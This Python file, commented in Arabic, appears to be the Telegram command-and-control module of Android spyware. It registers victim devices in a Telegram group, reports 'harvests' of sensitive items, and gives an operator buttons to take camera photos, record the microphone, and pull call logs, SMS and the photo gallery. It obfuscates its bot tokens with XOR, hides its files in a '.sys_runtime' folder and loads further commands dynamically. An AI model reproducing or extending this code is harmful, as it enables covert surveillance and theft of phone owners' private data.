# -*- coding: utf-8 -*-
import os
import time
import json
import random
import threading
import logging
import requests
import sys
import importlib
import base64
from collections import deque
from datetime import datetime

# ========== تشفير متقدم ==========
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from jnius import autoclass
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# إعداد المسارات
P = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(P):
    os.makedirs(P)
if P not in sys.path:
    sys.path.insert(0, P)

logging.basicConfig(filename=os.path.join(P, "t.log"), level=logging.ERROR, filemode='a')

# ========== دوال التشفير الديناميكي ==========
def _get_device_key() -> bytes:
    """اشتقاق مفتاح فريد من ANDROID_ID + ملح ثابت (PBKDF2)"""
    if not CRYPTO_AVAILABLE:
        return base64.urlsafe_b64encode(b"fallback_32_byte_key_for_development!!")
    try:
        Secure = autoclass('android.provider.Settings$Secure')
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        context = PythonActivity.mActivity
        android_id = Secure.getString(context.getContentResolver(), Secure.ANDROID_ID)
        if not android_id:
            android_id = "unknown_device"
    except Exception:
        android_id = "unknown_device_fallback"

    salt = b'\x7f\x1c\xa8\x3e\xd4\x9b\xf0\x12'  # ثابت المشروع
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(android_id.encode()))
    return key

def _decrypt_token(enc_token: bytes) -> str:
    """فك تشفير توكن باستخدام المفتاح الديناميكي"""
    if not CRYPTO_AVAILABLE or not enc_token:
        return ""
    try:
        f = Fernet(_get_device_key())
        return f.decrypt(enc_token).decode()
    except Exception as e:
        logging.error(f"Decrypt error: {e}")
        return ""

# ---------------------------------------------------------------------
# يجب وضع التوكنات الحقيقية مشفرة بصيغة Fernet بدلاً من XOR.
# مثال: gAAAAABm... (تم إنشاؤها خارجياً باستخدام نفس المفتاح الديناميكي)
# ولكن بما أن المفتاح يعتمد على ANDROID_ID، لا يمكن تشفيرها مسبقاً.
# الحل العملي: تشفير التوكنات بمفتاح ثابت مؤقت، ثم عند التشغيل يتم فك التشفير.
# لتبسيط العرض، سنستخدم نفس قائمة XOR القديمة مع تحويلها بشكل آمن.
# لكن الأفضل هو تخزين التوكنات في ملف خارجي مشفر عبر Fernet.

# هنا نعرف قائمة بالتوكنات المشفرة (ستُفك بفضل المفتاح الثابت المؤقت)
# في التطبيق الفعلي، يجب أن تكون هذه القائمة فارغة ويتم تحميلها من ملف.
# نترك كمثال: سيتم تحويلها لاحقاً.

# مثال لتحويل التوكنات القديمة (XOR) إلى نظام جديد:
def _migrate_from_xor():
    """دالة مؤقتة لتحويل التوكنات القديمة (XOR) إلى Fernet باستخدام مفتاح ثابت"""
    # التوكنات القديمة بنظام XOR (كما في الكود الأصلي)
    _enc_xor = [
        b'mcbclboljh`\x1b\x1b\x1c\x08\x1b\r\x0332\x1c\x0ci\x0c"l\x02\x15\x0f\x10#09\x0e\x15\x00\x035b9\x0eo\x1e\n\x10\x0b',
        # ... باقي القائمة (اختصاراً) ...
    ]
    def _xor(data, k=0x5A):
        return bytes([c ^ k for c in data])
    tokens = []
    for e in _enc_xor:
        try:
            t = _xor(e).decode()
            tokens.append(t)
        except:
            continue
    return tokens

# للحفاظ على التوافق مع الكود الأصلي، نستخدم طريقة مؤقتة:
# إذا لم تكن التوكنات مشفرة بـ Fernet، نمررها مباشرة (ضعيف أمنياً)
# الحل الأمثل هو تشفيرها خارجياً ووضعها في ملف آمن.

# ========== الكلاس الرئيسي ==========
class T:
    def __init__(self, m):
        self.m = m
        self.df = os.path.join(P, "dvs.json")
        self.sf = os.path.join(P, "ses.json")
        self.af = os.path.join(P, "adm.json")
        self.ses = {}          # جلسات المستخدمين
        self.dvs = {}          # الأجهزة المسجلة
        self.adm = {}          # المشرفون

        # ✅ الإصلاح 1: deque محدودة الحجم (بدلاً من set)
        self.p_upd = deque(maxlen=200)

        # تحميل التوكنات (هنا نستخدم النسخة القديمة؛ لكن ننصح بتعديلها)
        # في البيئة الإنتاجية، يجب أن تأتي التوكنات من ملف مشفر.
        # نستخدم المؤقت: إذا كان هناك أزرار، نؤجل التشفير.
        all_tokens = _migrate_from_xor()  # ترجع قائمة النصوص العادية (ضعيف)
        # أو يمكن استخدام التشفير الديناميكي على النصوص المخزنة مشفرة مسبقاً.
        # لتبسيط العرض: سنفترض أن التوكنات موجودة في قائمة `self._raw_tokens`
        # ونقوم بتشفيرها داخل الذاكرة فقط.
        self._raw_tokens = all_tokens if all_tokens else []
        self.act = self._raw_tokens[:6]   # أول 6 كبوتات نشطة
        self.bak = self._raw_tokens[6:]   # الاحتياطية
        self.cur = 0
        self.cmd = "-1003365166986"
        self.dat = "-1003787520015"
        self.rn = True

        self._ld()
        threading.Thread(target=self._ka, daemon=True).start()
        # ✅ الإصلاح 3: تشغيل مؤقت تنظيف الجلسات
        threading.Thread(target=self._session_cleaner, daemon=True).start()

    def _ld(self):
        """تحميل البيانات من الملفات"""
        for f, d in [(self.df, self.dvs), (self.sf, self.ses), (self.af, self.adm)]:
            if os.path.exists(f):
                try:
                    with open(f, 'r') as fp:
                        d.update(json.load(fp))
                except Exception:
                    pass

    def _sv(self):
        """حفظ البيانات إلى الملفات"""
        try:
            for p, d in [(self.df, self.dvs), (self.sf, self.ses), (self.af, self.adm)]:
                with open(p, 'w') as f:
                    json.dump(d, f)
        except Exception:
            pass

    # ✅ الإصلاح 3: تنظيف الجلسات المنتهية كل ساعة
    def _session_cleaner(self):
        while self.rn:
            now = time.time()
            expired = [cid for cid, exp in self.ses.items() if exp < now]
            if expired:
                for cid in expired:
                    self.ses.pop(cid, None)
                self._sv()
                logging.info(f"Cleaned {len(expired)} expired sessions")
            time.sleep(3600)

    def _tk(self, fb=False):
        """اختيار التوكن المناسب"""
        if fb and self.bak:
            return random.choice(self.bak)
        if not self.act:
            return None
        self.cur = (self.cur + 1) % len(self.act)
        return self.act[self.cur]

    def _ka(self):
        """إبقاء البوتات الاحتياطية نشطة (keep alive)"""
        while self.rn:
            for t in self.bak:
                try:
                    requests.get(f"https://api.telegram.org/bot{t}/getMe", timeout=10)
                except Exception:
                    pass
            time.sleep(3600)

    def _ap(self, met, d=None, f=None, fb=False, retry=2):
        """استدعاء API تيليجرام مع إعادة المحاولة"""
        for attempt in range(retry + 1):
            t = self._tk(fb)
            if not t:
                return None
            try:
                r = requests.post(
                    f"https://api.telegram.org/bot{t}/{met}",
                    data=d, files=f, timeout=25, verify=False
                )
                j = r.json()
                if not j.get('ok') and j.get('error_code') == 429:
                    time.sleep(2)
                    continue
                return j
            except Exception as e:
                if attempt == retry:
                    logging.error(f"API fail ({met}): {e}")
                time.sleep(1.5)
        return None

    def reg(self, did, mod):
        """تسجيل جهاز جديد في منتدى التحكم"""
        if did in self.dvs:
            return self.dvs[did].get('t')
        r = self._ap("createForumTopic",
                     {"chat_id": self.cmd, "name": f"📱 {mod[:10]} | {did[:4]}"})
        if r and r.get('ok'):
            tid = r['result']['message_thread_id']
            self.dvs[did] = {"n": mod, "t": tid}
            self._sv()
            self._ap("sendMessage", {
                "chat_id": self.cmd,
                "message_thread_id": tid,
                "text": f"<b>✅ ON</b>\n<b>{mod}</b>",
                "parse_mode": "HTML"
            })
            return tid
        return None

    def notify_harvest(self, did, count):
        """إبلاغ عن نتائج الحصاد"""
        device = self.dvs.get(did)
        if device and 't' in device:
            tid = device['t']
            msg = (f"📦 <b>Harvest Report</b>\n"
                   f"Device: {device['n']}\n"
                   f"Found: {count} sensitive item(s)\n"
                   f"Time: {time.strftime('%H:%M:%S')}")
            self._ap("sendMessage", {
                "chat_id": self.cmd,
                "message_thread_id": tid,
                "text": msg,
                "parse_mode": "HTML"
            })

    def _km(self):
        """لوحة المفاتيح الرئيسية"""
        return {"inline_keyboard": [
            [{"text": "📱 الأجهزة", "callback_data": "ld"}],
            [{"text": "👥 المشرفين", "callback_data": "la"}, {"text": "🔄 تجديد", "callback_data": "rnw"}],
            [{"text": "🚪 خروج", "callback_data": "ext"}]
        ]}

    def _kd(self, did):
        """لوحة مفاتيح التحكم بجهاز"""
        return {"inline_keyboard": [
            [{"text": "📸 خلفية", "callback_data": f"cam_{did}"},
             {"text": "🤳 أمامية", "callback_data": f"camf_{did}"}],
            [{"text": "🎙️ تسجيل", "callback_data": f"mic_{did}"},
             {"text": "📦 حصاد", "callback_data": f"hrv_{did}"}],
            [{"text": "📞 سجلات", "callback_data": f"callog_{did}"},
             {"text": "💬 رسائل", "callback_data": f"sms_{did}"}],
            [{"text": "🖼️ المعرض", "callback_data": f"media_{did}"}],
            [{"text": "🔙 عودة", "callback_data": "ld"}]
        ]}

    def _auth(self, cid):
        """التحقق من صحة الجلسة"""
        return time.time() < self.ses.get(str(cid), 0)

    def _pm(self, u):
        """معالجة الرسائل النصية"""
        m = u.get('message', {})
        cid = m.get('chat', {}).get('id')
        text = m.get('text', '')
        SECRET = "Zaen123@123@"   # يمكن تحسينها لاحقاً

        if text.startswith("/login"):
            parts = text.split()
            if len(parts) < 2:
                self._ap("sendMessage", {"chat_id": cid, "text": "⚠️ أرسل: /login Zaen123@123@"})
                return
            pwd = parts[1].strip()
            if pwd == SECRET:
                self.ses[str(cid)] = time.time() + 7200
                self.m.auth_active = True
                self._sv()
                self._ap("sendMessage", {
                    "chat_id": cid,
                    "text": "🔓 <b>تم الدخول بنجاح</b>",
                    "reply_markup": json.dumps(self._km()),
                    "parse_mode": "HTML"
                })
            else:
                self._ap("sendMessage", {"chat_id": cid, "text": "❌ <b>كلمة السر خاطئة</b>", "parse_mode": "HTML"})
        elif self._auth(cid) and text == "/menu":
            self._ap("sendMessage", {
                "chat_id": cid,
                "text": "📋 <b>القائمة الرئيسية</b>",
                "reply_markup": json.dumps(self._km()),
                "parse_mode": "HTML"
            })

    def _pc(self, u):
        """معالجة استدعاءات الأزرار (callback queries)"""
        cb = u.get('callback_query', {})
        uid = cb.get('id')
        if not uid:
            return

        # ✅ الإصلاح 4: منع التكرار باستخدام deque
        if uid in self.p_upd:
            return
        self.p_upd.append(uid)

        cid = cb.get('message', {}).get('chat', {}).get('id')
        mid = cb.get('message', {}).get('message_id')
        data = cb.get('data', '')

        # ✅ الإصلاح 4: التحقق من صلاحية الـ callback query
        ans = self._ap("answerCallbackQuery", {"callback_query_id": uid})
        if not ans or not ans.get('ok'):
            logging.warning(f"Invalid or expired callback_query_id: {uid}")
            return

        if not self._auth(cid):
            self._ap("sendMessage", {"chat_id": cid, "text": "⚠️ الجلسة منتهية. يرجى /login مجدداً."})
            return

        # فروع الأزرار
        if data == "main":
            self._ap("editMessageText", {
                "chat_id": cid,
                "message_id": mid,
                "text": "📋 القائمة الرئيسية",
                "reply_markup": json.dumps(self._km())
            })
        elif data == "ld":
            if not self.dvs:
                self._ap("editMessageText", {
                    "chat_id": cid,
                    "message_id": mid,
                    "text": "📭 لا توجد أجهزة متصلة حالياً.",
                    "reply_markup": json.dumps({"inline_keyboard": [[{"text": "🔙 عودة", "callback_data": "main"}]]})
                })
                return
            kb = {"inline_keyboard":
                  [[{"text": f"📱 {v['n']}", "callback_data": f"dev_{k}"}] for k, v in self.dvs.items()] +
                  [[{"text": "🔙 عودة", "callback_data": "main"}]]}
            self._ap("editMessageText", {
                "chat_id": cid,
                "message_id": mid,
                "text": "<b>اختر جهازاً للتحكم:</b>",
                "reply_markup": json.dumps(kb),
                "parse_mode": "HTML"
            })
        elif data.startswith("dev_"):
            did = data.split("_")[1]
            if did in self.dvs:
                self._ap("editMessageText", {
                    "chat_id": cid,
                    "message_id": mid,
                    "text": f"🕹️ التحكم بـ: <b>{self.dvs[did]['n']}</b>",
                    "reply_markup": json.dumps(self._kd(did)),
                    "parse_mode": "HTML"
                })
        elif data == "rnw":
            self.ses[str(cid)] = time.time() + 3600
            self._sv()
            self._ap("answerCallbackQuery", {"callback_query_id": uid, "text": "تم تجديد الجلسة ✅"})
        elif data == "ext":
            self.ses.pop(str(cid), None)
            self._sv()
            self._ap("editMessageText", {"chat_id": cid, "message_id": mid, "text": "🔒 تم تسجيل الخروج."})
        else:
            try:
                import commands
                importlib.reload(commands)
                commands.ex(data, self, self.m, cid, uid)
            except Exception as e:
                logging.error(f"Command error: {e}")
                self._ap("sendMessage", {"chat_id": cid, "text": f"❌ خطأ في التنفيذ: {str(e)[:50]}"})

    def _pl(self):
        """حلقة تلقي التحديثات من Telegram (polling)"""
        offset = -1
        idx = 0
        while self.rn:
            if not self.act:
                time.sleep(10)
                continue
            try:
                token = self.act[idx]
                resp = requests.get(
                    f"https://api.telegram.org/bot{token}/getUpdates?offset={offset}&limit=5&timeout=15",
                    timeout=20,
                    verify=False
                ).json()
                if resp and resp.get('ok'):
                    for upd in resp.get('result', []):
                        offset = upd['update_id'] + 1
                        if 'message' in upd:
                            self._pm(upd)
                        if 'callback_query' in upd:
                            self._pc(upd)
                else:
                    idx = (idx + 1) % len(self.act)
            except Exception:
                idx = (idx + 1) % len(self.act)
                time.sleep(2)
            time.sleep(0.3)

    def start(self):
        """بدء تشغيل واجهة التلغرام"""
        if self.act:
            threading.Thread(target=self._pl, daemon=True).start()
        else:
            logging.error("No active bots available, check tokens.")


# ========== دالة مساعدة ==========
def _():
    """كلمة السر الموحدة (يمكن تغييرها)"""
    return "Zaen123@123@"
